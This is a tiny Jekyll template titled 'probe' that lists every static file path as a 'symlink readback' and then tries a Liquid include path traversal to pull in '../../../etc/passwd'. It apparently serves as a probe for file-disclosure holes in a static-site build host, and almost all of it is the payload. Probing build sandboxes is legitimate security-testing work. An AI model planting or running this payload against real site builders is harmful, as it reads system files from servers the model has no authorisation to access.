---
title: probe
---
symlink readback:

{% for f in site.static_files %}- {{ f.path }}
{% endfor %}

liquid include traversal:
{% include ../../../etc/passwd %}
